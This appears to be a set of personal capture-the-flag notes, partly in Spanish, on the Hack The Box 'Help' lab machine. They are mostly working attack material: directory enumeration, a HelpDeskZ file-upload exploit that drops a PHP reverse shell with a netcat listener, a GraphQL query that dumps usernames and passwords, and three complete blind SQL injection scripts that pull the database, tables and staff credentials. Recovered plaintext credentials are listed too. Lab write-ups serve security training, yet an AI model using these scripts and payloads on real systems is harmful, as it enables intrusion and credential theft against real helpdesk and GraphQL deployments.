---
title: "Help"
---

# Help

```bash
gobuster dir -u http://help.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 150
```

http://help.htb/support/readme.html

Version: 1.0.2 from 1st June 2015


```
searchsploit HelpDeskZ
```

```bash
~/.pyenv/versions/2.7.18/bin/python 40300.py  http://help.htb/support/uploads/tickets/ rev_shell.php
```

```
nc -lvnp 4444
```

# GraphQL

```bash
git clone https://github.com/dolevf/graphw00f.git
```

```bash
python3 main.py -f -t http://10.10.10.121:3000/graphql
```

Instrospection query
```json
{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

```http
POST /graphql HTTP/1.1
Host: 10.10.10.121
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 82

{"query":"query user {\n    user {\n        password\n        username\n    }\n}"}
```

```
helpme@helpme.com \ godhelpmeplz
```

Extraer nombre de la base de datos
```python
#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, time, pdb, urllib3
from urllib.parse import quote

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

#Variables Globales
characters= string.ascii_lowercase + string.ascii_uppercase + string.digits + '_'
Cookie= {"usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE3IrjgqzGu%2BU2KAyaJPiVy97oC5vrSOyyszlYc1LNlNw%3D%3D"}
proxies = {"http": "http://127.0.0.1:8080"}

def makeSQLI():
        s=requests.session()
        s.verify = False

        p1= log.progress("Fuerza Bruta")
        p1.status("Iniciando proceso de fuerza bruta")

        time.sleep(2)

        p2= log.progress("Database")

        database= ""
        
        for position in range(1,8): #Rango 1 - (tamaño database + 1)
                for character in characters:
                        payload = f" AND ((substr((select database()),{position},1))='{character}') -- -"
                        p1.status(payload)
                        url= "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6" + payload
                        url = quote(url, safe=':/?&=.,')
                        r = s.get(url,cookies=Cookie,allow_redirects=False)
                        if not "helpdesk" in r.text:
                                database += character
                                p2.status(database)
                                break

if __name__ == '__main__':
        makeSQLI()
```

Extraer nombres de las tablas
```python
#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, time, pdb, urllib3
from urllib.parse import quote

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

#Variables Globales
characters= string.ascii_lowercase + string.ascii_uppercase + string.digits + '_'
Cookie= {"usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE3IrjgqzGu%2BU2KAyaJPiVy97oC5vrSOyyszlYc1LNlNw%3D%3D"}
proxies = {"http": "http://127.0.0.1:8080"}


def makeSQLI():
	s=requests.session()
	s.verify = False

	p1= log.progress("Fuerza Bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	numChars = 0

	p2= log.progress("Tables")

	table_name= ""
	for table in range(0,5):
		for position in range(1,15): #Rango 1 - (tamaño database + 1)
			for character in characters:
				payload = f" AND (substr((select table_name from information_schema.tables where table_schema=database() limit {table},1) ,{position},1)='{character}') -- -"
				p1.status(payload)
				url= "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6" + payload
				url = quote(url, safe=':/?&=.,')
				r = s.get(url,cookies=Cookie,allow_redirects=False)
				if not "helpdesk" in r.text:
					table_name += character
					p2.status(table_name)
					break
				else:
					numChars+= 1
			if numChars == len(characters):
				break
		table_name += ", "

if __name__ == '__main__':
	makeSQLI()

```

Extraer contenido

```python
#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, time, pdb, urllib3
from urllib.parse import quote

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

#Variables Globales
characters= string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + ':'
Cookie= {"usrhash":"0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BE3IrjgqzGu%2BU2KAyaJPiVy97oC5vrSOyyszlYc1LNlNw%3D%3D"}
proxies = {"http": "http://127.0.0.1:8080"}

def makeSQLI():
	s=requests.session()
	s.verify = False

	p1= log.progress("Fuerza Bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2= log.progress("Data")

	data= ""
	for position in range(1,50): #Rango 1 - (tamaño database + 1)
		for character in characters:
			payload = f" AND (substr((select group_concat(username,0x3A,password) from staff) ,{position},1)='{character}') -- -"
			p1.status(payload)
			url= "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6" + payload
			url = quote(url, safe=':/?&=.,')
			r = s.get(url,cookies=Cookie,allow_redirects=False)
			if not "helpdesk" in r.text:
				data += character
				p2.status(data)
				break
	data += ", "

if __name__ == '__main__':
	makeSQLI()

```

```
admin \ Welcome1
```

```
uname -a 
```
